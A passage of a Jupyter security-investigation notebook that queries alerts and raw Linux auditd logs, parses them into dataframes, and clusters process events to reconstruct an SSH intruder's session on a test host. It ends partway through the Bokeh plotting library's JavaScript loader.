  {
   "cell_type": "markdown",
   "metadata": {
    "tags": [
     "todo"
    ]
   },
   "source": [
    "### Choose Timespan to look for alerts\n",
    "\n",
    "Specify a time range to search for alerts. One this is set run the following cell to retrieve any alerts in that time window.<br>\n",
    "You can change the time range and re-run the queries until you find the alerts that you want."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0ca0d470a2df4fb68e6b2b1f31b39feb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "900f9b86943642ce8ba5aa9d8da5c54c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 2, 27), description='Origin Date'), Text(value='02:12:57.7…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8b6ef86a3249411d914cbe232cf9e41a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-2, 1), description='Time Range (day):', layout=Layout(width='80%'), max=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "alert_q_times = mas.QueryTime(units='day', max_before=20, before=2, max_after=1)\n",
    "alert_q_times.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Select alert from list\n",
    "As you select an alert, the main properties will be shown below the list.<br>\n",
    "Use the filter box to narrow down your search to any substring in the AlertName."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "8  distinct alert types\n",
      "29  distinct alerts\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0a20855865a04cf4aed282b4e2c6edf9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value='', description='Filter alerts by title:', style=DescriptionStyle(description_width=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Query for alerts\n",
    "alert_counts = qry.list_alerts_counts(provs=[alert_q_times])\n",
    "alert_list = qry.list_alerts(provs=[alert_q_times])\n",
    "print(len(alert_counts), ' distinct alert types')\n",
    "print(len(alert_list), ' distinct alerts')\n",
    "\n",
    "from msticpy.nbtools.entityschema import GeoLocation\n",
    "from msticpy.sectools.geoip import GeoLiteLookup\n",
    "iplocation = GeoLiteLookup()\n",
    "\n",
    "security_alert = None\n",
    "alert_ip_entities = []\n",
    "\n",
    "def show_full_alert(selected_alert):\n",
    "    global security_alert, alert_ip_entities\n",
    "    security_alert = mas.SecurityAlert(alert_select.selected_alert)\n",
    "    alert_ip_entities = get_alert_ips(security_alert)\n",
    "    mas.disp.display_alert(security_alert, show_entities=True)\n",
    "    \n",
    "def get_alert_ips(alert):\n",
    "    alert_ip_entities = [e for e in alert.entities if isinstance(e, mas.IpAddress)]\n",
    "\n",
    "    # Extract any additional IP addresses from text in the alert\n",
    "    ioc_extractor = sectools.IoCExtract()\n",
    "    alert_iocs = ioc_extractor.extract(src=str(alert))\n",
    "    addl_ip_addrs = alert_iocs.get('ipv4', [])\n",
    "    \n",
    "    if addl_ip_addrs:\n",
    "        _, ip_entities = iplocation.lookup_ip(ip_addr_list=addl_ip_addrs)\n",
    "\n",
    "        current_ips = [e.Address for e in alert_ip_entities]\n",
    "        for new_ip_entity in ip_entities:\n",
    "            if new_ip_entity.Address not in current_ips:\n",
    "                alert_ip_entities.append(new_ip_entity)\n",
    "    return alert_ip_entities\n",
    "            \n",
    "# Display the alert list\n",
    "alert_select = mas.AlertSelector(alerts=alert_list, action=show_full_alert)\n",
    "alert_select.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# See what is happening on the host in this Alert\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{ 'HostName': 'MSTICALERTSLXVM2',\n",
      "  'NetBiosName': 'MSTICALERTSLXVM2',\n",
      "  'OSFamily': 'Linux',\n",
      "  'Type': 'host'}\n",
      "2019-02-16 03:24:04\n"
     ]
    }
   ],
   "source": [
    "print(security_alert.primary_host)\n",
    "print(security_alert.TimeGenerated)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- We can see that it's a Linux host and can view the alert time.\n",
    "- Set the time boundaries to be a hour or two either side of the alert"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "34767f71e11a4e8fa29407e2c48656c4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HTML(value='<h4>Set time bounds for alert host - at least 1hr either side of the alert</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2b056e3ad9774f9dbe1cc0db990d2432",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 2, 16), description='Origin Date'), Text(value='03:23:54',…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6a4c2fb60f484ef8bc06636bdff2cbf5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-2, 1), description='Time Range (hour):', layout=Layout(width='80%'), max…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%config Kqlmagic.auto_dataframe=False\n",
    "host1_q_times = mas.QueryTime(label='Set time bounds for alert host - at least 1hr either side of the alert',\n",
    "                           units='hour', max_before=48, before=2, after=1, \n",
    "                           max_after=24, origin_time=security_alert.StartTimeUtc)\n",
    "host1_q_times.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Data is in Raw Auditd format so we need to unpack and re-assemble it"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "getting data...\n",
      "17469 raw auditd mssgs downloaded\n",
      "Unpacking auditd messages for 17469 events...\n",
      "Building output dataframe...\n",
      "Fixing timestamps...\n",
      "Complete. 17469 output rows time: 12.448911 sec\n",
      "Writing cache file\n",
      "17469 events read.\n"
     ]
    }
   ],
   "source": [
    "import pickle\n",
    "from os import path\n",
    "\n",
    "# Retrieve Linux auditd events\n",
    "linux_events = r'''\n",
    "AuditLog_CL\n",
    "| where Computer has '{hostname}'\n",
    "| where TimeGenerated >= datetime({start})\n",
    "| where TimeGenerated <= datetime({end})\n",
    "| extend mssg_parts = extract_all(@\"type=(?P<type>[^\\s]+)\\s+msg=audit\\((?P<mssg_id>[^)]+)\\):\\s+(?P<mssg>[^\\r]+)\\r?\", dynamic(['type', 'mssg_id', 'mssg']), RawData)\n",
    "| extend mssg_type = tostring(mssg_parts[0][0]), mssg_id = tostring(mssg_parts[0][1])\n",
    "| project TenantId, TimeGenerated, Computer, mssg_type, mssg_id, mssg_parts\n",
    "| extend mssg_content = split(mssg_parts[0][2],' ')\n",
    "| extend typed_mssg = pack(mssg_type, mssg_content)\n",
    "| summarize AuditdMessage = makelist(typed_mssg) by TenantId, TimeGenerated, Computer, mssg_id\n",
    "'''.format(start=host1_q_times.start, end=host1_q_times.end,\n",
    "           hostname=security_alert.hostname)\n",
    "\n",
    "_PICKLE_FILE = 'lx_auditd.cache'\n",
    "linux_events_all = None\n",
    "if path.exists(_PICKLE_FILE):\n",
    "    with open(_PICKLE_FILE, 'rb') as cache_file:\n",
    "        linux_events_all = pickle.load(cache_file)\n",
    "\n",
    "if linux_events_all is None:\n",
    "    print('getting data...')\n",
    "    %kql -query linux_events\n",
    "    linux_events_df = _kql_raw_result_.to_dataframe()\n",
    "    print(f'{len(linux_events_df)} raw auditd mssgs downloaded')\n",
    "\n",
    "\n",
    "import codecs\n",
    "from datetime import datetime\n",
    "encoded_params = {'EXECVE': {'a0', 'a1', 'a2', 'a3', 'arch'},\n",
    "                  'PROCTITLE': {'proctitle'},\n",
    "                  'USER_CMD': {'cmd'}}\n",
    "\n",
    "def unpack_auditd(audit_str):\n",
    "    event_dict = {}\n",
    "    for record in audit_str:\n",
    "        \n",
    "        for rec_key, rec_val in record.items():\n",
    "            rec_dict = {}\n",
    "            encoded_fields_map = encoded_params.get(rec_key, None)\n",
    "            for rec_item in rec_val:\n",
    "                rec_split = rec_item.split('=', maxsplit=1)\n",
    "                if len(rec_split) == 1:\n",
    "                    rec_dict[rec_split[0]] = None\n",
    "                    continue\n",
    "                if (not encoded_fields_map or rec_split[1].startswith('\"') or\n",
    "                        rec_split[0] not in encoded_fields_map):\n",
    "                    field_value = rec_split[1].strip('\\\"')\n",
    "                else:\n",
    "                    try:\n",
    "                        field_value = codecs.decode(rec_split[1], 'hex').decode('utf-8')\n",
    "                    except:\n",
    "                        field_value = rec_split[1]\n",
    "                        print(rec_val)\n",
    "                        print('ERR:', rec_key, rec_split[0], rec_split[1], type(rec_split[1]))\n",
    "                rec_dict[rec_split[0]] = field_value\n",
    "            event_dict[rec_key] = rec_dict\n",
    "        \n",
    "    return event_dict\n",
    "\n",
    "USER_START = {'pid': 'int', 'uid': 'int', 'auid': 'int', \n",
    "              'ses': 'int', 'msg': None, 'acct': None, 'exe': None, \n",
    "              'hostname': None, 'addr': None, 'terminal': None, \n",
    "              'res': None}\n",
    "FIELD_DEFS = {'SYSCALL': {'success': None, 'ppid': 'int', 'pid': 'int', \n",
    "                          'auid': 'int', 'uid': 'int', 'gid': 'int',\n",
    "                          'euid': 'int', 'egid': 'int', 'ses': 'int',\n",
    "                          'exe': None, 'com': None},\n",
    "              'CWD': {'cwd': None},\n",
    "              'PROCTITLE': {'proctitle': None},\n",
    "              'LOGIN': {'pid': 'int', 'uid': 'int', 'tty': None, 'old-ses': 'int', \n",
    "                        'ses': 'int', 'res': None},\n",
    "              'EXECVE': {'argc': 'int', 'a0': None, 'a1': None, 'a2': None},\n",
    "              'USER_START': USER_START,\n",
    "              'USER_END': USER_START,\n",
    "              'CRED_DISP': USER_START,\n",
    "              'USER_ACCT': USER_START,\n",
    "              'CRED_ACQ': USER_START,\n",
    "              'USER_CMD': {'pid': 'int', 'uid': 'int', 'auid': 'int', \n",
    "                           'ses': 'int', 'msg': None, 'cmd': None,\n",
    "                           'terminal': None, 'res': None},\n",
    "             }\n",
    "\n",
    "def extract_event(message_dict):\n",
    "    if 'SYSCALL' in message_dict:\n",
    "        proc_create_dict = {}\n",
    "        for mssg_type in ['SYSCALL', 'CWD', 'EXECVE', 'PROCTITLE']:\n",
    "            if (not mssg_type in message_dict or\n",
    "                    not mssg_type in FIELD_DEFS) :\n",
    "                continue\n",
    "            for fieldname, conv in FIELD_DEFS[mssg_type].items():\n",
    "                value = message_dict[mssg_type].get(fieldname, None)\n",
    "                if not value:\n",
    "                    continue\n",
    "                if conv:\n",
    "                    if conv == 'int':\n",
    "                        value = int(value)\n",
    "                        if value == 4294967295:\n",
    "                            value = -1\n",
    "                proc_create_dict[fieldname] = value\n",
    "            if mssg_type == 'EXECVE':\n",
    "                args = int(proc_create_dict.get('argc', 1))\n",
    "                arg_strs = []\n",
    "                for arg_idx in range(0, args):\n",
    "                    arg_strs.append(proc_create_dict.get(f'a{arg_idx}', ''))\n",
    "                    \n",
    "                proc_create_dict['cmdline'] = ' '.join(arg_strs)\n",
    "        return 'SYSCALL', proc_create_dict\n",
    "    else:\n",
    "        event_dict = {}                                            \n",
    "        for mssg_type, mssg in message_dict.items():\n",
    "            if mssg_type in FIELD_DEFS:\n",
    "                for fieldname, conv in FIELD_DEFS[mssg_type].items():\n",
    "                    value = message_dict[mssg_type].get(fieldname, None)\n",
    "                    if conv:\n",
    "                        if conv == 'int':\n",
    "                            value = int(value)\n",
    "                            if value == 4294967295:\n",
    "                                value = -1\n",
    "                    event_dict[fieldname] = value\n",
    "            else:\n",
    "                \n",
    "                event_dict.update(message_dict[mssg_type])\n",
    "        return list(message_dict.keys())[0], event_dict\n",
    "\n",
    "    \n",
    "def move_cols_to_front(df, column_count):\n",
    "    \"\"\"Reorder columms to put the last column count cols to front.\"\"\"\n",
    "    return df[list(df.columns[-column_count:]) + list(df.columns[:-column_count])]\n",
    "\n",
    "\n",
    "def extract_events_to_df(data, event_type=None, verbose=False):\n",
    "    \n",
    "    if verbose:\n",
    "        start_time = datetime.utcnow()\n",
    "        print(f'Unpacking auditd messages for {len(data)} events...')\n",
    "    tmp_df = (data.apply(lambda x: extract_event(unpack_auditd(x.AuditdMessage)), \n",
    "                         axis=1, result_type='expand')\n",
    "                  .rename(columns={0: 'EventType', \n",
    "                                   1: 'EventData'})\n",
    "                  )\n",
    "    # if only one type of event is requested\n",
    "    if event_type:\n",
    "        tmp_df = tmp_df[tmp_df['EventType'] == event_type]\n",
    "        if verbose:\n",
    "            print(f'Event subset = ', event_type, ' (events: {len(tmp_df)})')\n",
    "    \n",
    "    if verbose:\n",
    "        print('Building output dataframe...')\n",
    "        \n",
    "    tmp_df = (tmp_df.apply(lambda x: pd.Series(x.EventData), axis=1)\n",
    "              .merge(tmp_df[['EventType']], left_index=True, right_index=True)\n",
    "              .merge(data.drop(['AuditdMessage'], axis=1), \n",
    "                 how='inner', left_index=True, right_index=True)\n",
    "              .dropna(axis=1, how='all'))\n",
    "    \n",
    "    if verbose:\n",
    "        print('Fixing timestamps...')\n",
    "        \n",
    "    # extract real timestamp from mssg_id\n",
    "    tmp_df['TimeStamp'] = (tmp_df.apply(lambda x:\n",
    "                                        datetime.utcfromtimestamp(float(x.mssg_id.split(':')[0])),\n",
    "                                        axis=1))\n",
    "    tmp_df = (tmp_df.drop(['TimeGenerated'], axis=1)\n",
    "                    .rename(columns={'TimeStamp': 'TimeGenerated'})\n",
    "                    .pipe(move_cols_to_front, column_count=5))\n",
    "    if verbose:\n",
    "        print(f'Complete. {len(tmp_df)} output rows', end=' ')\n",
    "        delta = datetime.utcnow() - start_time\n",
    "        print(f'time: {delta.seconds + delta.microseconds/1_000_000} sec')\n",
    "        \n",
    "    return tmp_df\n",
    "\n",
    "\n",
    "def get_event_subset(data, event_type):\n",
    "    return (data[data['EventType'] == event_type]\n",
    "             .dropna(axis=1, how='all')\n",
    "             .infer_objects())\n",
    "\n",
    "\n",
    "if linux_events_all is None:\n",
    "    linux_events_all = extract_events_to_df(linux_events_df, verbose=True)\n",
    "\n",
    "    with open(_PICKLE_FILE, 'ab') as cache_file:\n",
    "        print('Writing cache file')\n",
    "        pickle.dump(linux_events_all, cache_file)\n",
    "        \n",
    "print(f'{len(linux_events_all)} events read.')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='linux_login_ips'></a>[Contents](#toc)\n",
    "## Get Any External Logins (that have an IP Address Recorded)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "13976 Process Create Events\n",
      "265 Login Events\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Computer</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>pid</th>\n",
       "      <th>ses</th>\n",
       "      <th>acct</th>\n",
       "      <th>addr</th>\n",
       "      <th>exe</th>\n",
       "      <th>hostname</th>\n",
       "      <th>msg</th>\n",
       "      <th>res_cred</th>\n",
       "      <th>ses_cred</th>\n",
       "      <th>terminal</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>63</th>\n",
       "      <td>MSTICAlertsLxVM2</td>\n",
       "      <td>2019-02-16 03:51:55.865</td>\n",
       "      <td>22838</td>\n",
       "      <td>190715</td>\n",
       "      <td>dbadmin</td>\n",
       "      <td>23.97.60.214</td>\n",
       "      <td>/usr/sbin/sshd</td>\n",
       "      <td>23.97.60.214</td>\n",
       "      <td>'op=PAM:setcred</td>\n",
       "      <td>success'</td>\n",
       "      <td>-1</td>\n",
       "      <td>ssh</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>169</th>\n",
       "      <td>MSTICAlertsLxVM2</td>\n",
       "      <td>2019-02-16 03:23:17.590</td>\n",
       "      <td>19803</td>\n",
       "      <td>190671</td>\n",
       "      <td>dbadmin</td>\n",
       "      <td>23.97.60.214</td>\n",
       "      <td>/usr/sbin/sshd</td>\n",
       "      <td>23.97.60.214</td>\n",
       "      <td>'op=PAM:setcred</td>\n",
       "      <td>success'</td>\n",
       "      <td>-1</td>\n",
       "      <td>ssh</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "             Computer           TimeGenerated    pid     ses     acct  \\\n",
       "63   MSTICAlertsLxVM2 2019-02-16 03:51:55.865  22838  190715  dbadmin   \n",
       "169  MSTICAlertsLxVM2 2019-02-16 03:23:17.590  19803  190671  dbadmin   \n",
       "\n",
       "             addr             exe      hostname              msg  res_cred  \\\n",
       "63   23.97.60.214  /usr/sbin/sshd  23.97.60.214  'op=PAM:setcred  success'   \n",
       "169  23.97.60.214  /usr/sbin/sshd  23.97.60.214  'op=PAM:setcred  success'   \n",
       "\n",
       "     ses_cred terminal  \n",
       "63         -1      ssh  \n",
       "169        -1      ssh  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### What is happening in these sessions?"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "analyzing data...\n",
      "Number of input events: 13976\n",
      "Number of clustered events: 155\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d1c4ba46508041709a2ba44d36fa2b14",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "interactive(children=(Select(description='Select Session to view', layout=Layout(width='95%'), options=(190715…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "lx_proc_create = get_event_subset(linux_events_all,'SYSCALL')\n",
    "print(f'{len(lx_proc_create)} Process Create Events')\n",
    "\n",
    "lx_login = (get_event_subset(linux_events_all, 'LOGIN')\n",
    "        .merge(get_event_subset(linux_events_all, 'CRED_ACQ'), \n",
    "               how='inner',\n",
    "               left_on=['old-ses', 'pid', 'uid'], \n",
    "               right_on=['ses', 'pid', 'uid'],\n",
    "               suffixes=('', '_cred')).drop(['old-ses','TenantId_cred', \n",
    "                                             'Computer_cred'], axis=1)\n",
    "        .dropna(axis=1, how='all'))\n",
    "print(f'{len(lx_login)} Login Events')\n",
    "\n",
    "\n",
    "                   \n",
    "\n",
    "logins_with_ips = (lx_login[lx_login['addr'] != '?']\n",
    "                   [['Computer', 'TimeGenerated','pid', 'ses', \n",
    "                     'acct', 'addr', 'exe', 'hostname', 'msg',\n",
    "                     'res_cred', 'ses_cred', 'terminal']])\n",
    "if len(logins_with_ips) > 0:\n",
    "    display(logins_with_ips)\n",
    "    \n",
    "    # add the source IPs if not alert \n",
    "    new_ips = logins_with_ips['addr'].drop_duplicates().tolist()\n",
    "    current_ips = [e.Address for e in alert_ip_entities]\n",
    "    for new_ip in new_ips:\n",
    "        if new_ip not in current_ips:\n",
    "            ip_entity = mas.IpAddress(Address=new_ip)\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            alert_ip_entities.append(ip_entity)\n",
    "    \n",
    "\n",
    "display(Markdown('### What is happening in these sessions?'))\n",
    "\n",
    "# Mapping to Windows-like event to work more easily with clustering\n",
    "lx_to_proc_create = {'acct': 'SubjectUserName',\n",
    "                     'uid': 'SubjectUserSid',\n",
    "                     'user': 'SubjectUserName',\n",
    "                     'ses': 'SubjectLogonId',\n",
    "                     'pid': 'NewProcessId',\n",
    "                     'exe': 'NewProcessName',\n",
    "                     'ppid': 'ProcessId',\n",
    "                     'cmdline': 'CommandLine',}\n",
    "\n",
    "proc_create_to_lx = {'SubjectUserName': 'acct',\n",
    "                     'SubjectUserSid': 'uid',\n",
    "                     'SubjectUserName': 'user',\n",
    "                     'SubjectLogonId': 'ses',\n",
    "                     'NewProcessId': 'pid',\n",
    "                     'NewProcessName': 'exe',\n",
    "                     'ProcessId': 'ppid',\n",
    "                     'CommandLine': 'cmdline',}\n",
    "\n",
    "lx_to_logon = {'acct': 'SubjectUserName',\n",
    "               'auid': 'SubjectUserSid',\n",
    "               'user': 'TargetUserName',\n",
    "               'uid': 'TargetUserSid',\n",
    "               'ses': 'TargetLogonId',\n",
    "               'exe': 'LogonProcessName',\n",
    "               'terminal': 'LogonType',\n",
    "               'msg': 'AuthenticationPackageName',\n",
    "               'res': 'Status',\n",
    "               'addr': 'IpAddress',\n",
    "               'hostname': 'WorkstationName',}\n",
    "\n",
    "logon_to_lx = {'SubjectUserName': 'acct',\n",
    "               'SubjectUserSid': 'auid',\n",
    "               'TargetUserName': 'user',\n",
    "               'TargetUserSid': 'uid',\n",
    "               'TargetLogonId': 'ses',\n",
    "               'LogonProcessName': 'exe',\n",
    "               'LogonType': 'terminal',\n",
    "               'AuthenticationPackageName': 'msg',\n",
    "               'Status': 'res',\n",
    "               'IpAddress': 'addr',\n",
    "               'WorkstationName': 'hostname',}\n",
    "\n",
    "lx_proc_create_trans = lx_proc_create.rename(columns=lx_to_proc_create)\n",
    "lx_login_trans = lx_login.rename(columns=lx_to_logon)\n",
    "\n",
    "print('analyzing data...')\n",
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features\n",
    "\n",
    "feature_procs_h1 = add_process_features(input_frame=lx_proc_create_trans,\n",
    "                                        path_separator=security_alert.path_separator)\n",
    "\n",
    "\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "(clus_events, dbcluster, x_data) = dbcluster_events(data=feature_procs_h1,\n",
    "                                                    cluster_columns=['commandlineTokensFull', \n",
    "                                                                     'pathScore',\n",
    "                                                                    'SubjectUserSid'],\n",
    "                                                    time_column='TimeGenerated',\n",
    "                                                    max_cluster_distance=0.0001)\n",
    "print('Number of input events:', len(feature_procs_h1))\n",
    "print('Number of clustered events:', len(clus_events))\n",
    "(clus_events.sort_values('TimeGenerated')[['TimeGenerated', 'LastEventTime',\n",
    "                                           'NewProcessName', 'CommandLine', \n",
    "                                           'ClusterSize', 'commandlineTokensFull',\n",
    "                                           'SubjectLogonId', 'SubjectUserSid',\n",
    "                                           'pathScore', 'isSystemSession']]\n",
    "    .sort_values('ClusterSize', ascending=True));\n",
    "\n",
    "                   \n",
    "\n",
    "def view(x=''):\n",
    "    procs = (clus_events[clus_events['SubjectLogonId']==x]\n",
    "            [['TimeGenerated', 'NewProcessName','CommandLine', \n",
    "              'NewProcessId', 'SubjectUserSid', 'cwd', 'ClusterSize', 'SubjectLogonId']])\n",
    "    display(Markdown(f'{len(procs)} process events'))\n",
    "    display(procs.query('SubjectUserSid != 0'))\n",
    "    \n",
    "items = logins_with_ips['ses'].unique().tolist()\n",
    "w = widgets.Select(options=items, description='Select Session to view', **WIDGET_DEFAULTS)\n",
    "interactive(view, x=w)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- We can see that the attacker is retrieve host information including contents of /etc/passwd.\n",
    "- Looks like a shell script is being downloaded and set as executable. \n",
    "- Finally, looks like something is happening with the cron scheduler - this is just listing crontab but likely this is a precursor to installing a persistent presence on the machine."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='alert_host_net'></a>[Contents](#toc)\n",
    "# Host Network Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Looking for IP addresses of  MSTICALERTSLXVM2\n",
      "getting data...\n",
      "10.0.3.4\n",
      "104.211.30.1\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "### Flow Time and Protocol Distribution"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "getting data... done\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.pydata.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1001\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof (root._bokeh_onload_callbacks) === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
